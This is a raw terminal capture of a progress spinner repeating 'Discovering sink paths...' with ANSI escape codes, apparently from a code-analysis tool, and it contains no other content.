[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠴[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m [1mDiscovering sink paths...[0m[2K[32m⠏[0m [1mDiscovering sink paths...[0m[2K[32m⠋[0m [1mDiscovering sink paths...[0m[2K[32m⠙[0m [1mDiscovering sink paths...[0m[2K[32m⠹[0m [1mDiscovering sink paths...[0m[2K[32m⠸[0m [1mDiscovering sink paths...[0m[2K[32m⠼[0m [1mDiscovering sink paths...[0m[2K[32m⠦[0m [1mDiscovering sink paths...[0m[2K[32m⠧[0m [1mDiscovering sink paths...[0m[2K[32m⠇[0m 